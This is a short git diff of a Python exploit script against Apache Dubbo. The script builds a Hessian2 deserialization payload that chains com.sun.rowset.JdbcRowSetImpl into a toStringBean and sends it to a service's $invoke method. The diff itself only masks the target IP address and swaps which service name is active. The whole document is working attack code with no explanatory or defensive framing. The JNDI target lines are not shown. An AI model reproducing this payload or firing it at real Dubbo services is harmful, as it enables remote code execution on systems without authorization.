@@ -1,8 +1,8 @@
 from dubbo.codec.hessian2 import Decoder,new_object
 from dubbo.client import DubboClient
 
-# client = DubboClient('10.201.93.100', 20880)
-client = DubboClient('10.201.93.100', 12345)
+# client = DubboClient('10.xx.xx.1xx00', 20880)
+client = DubboClient('10.xx.xx.xx', 12345)
 
 JdbcRowSetImpl=new_object(
     'com.sun.rowset.JdbcRowSetImpl',
@@ -20,8 +20,8 @@ toStringBean=new_object(
     )
 
 resp = client.send_request_and_return_response(
-    # service_name='cn.rui0',
-    service_name='org.apache.dubbo.spring.boot.demo.consumer.DemoService',
+    service_name='cn.rui0',
+    # service_name='org.apache.dubbo.spring.boot.demo.consumer.DemoService',
     service_version='',
     method_name='$invoke',
     args=[toStringBean])
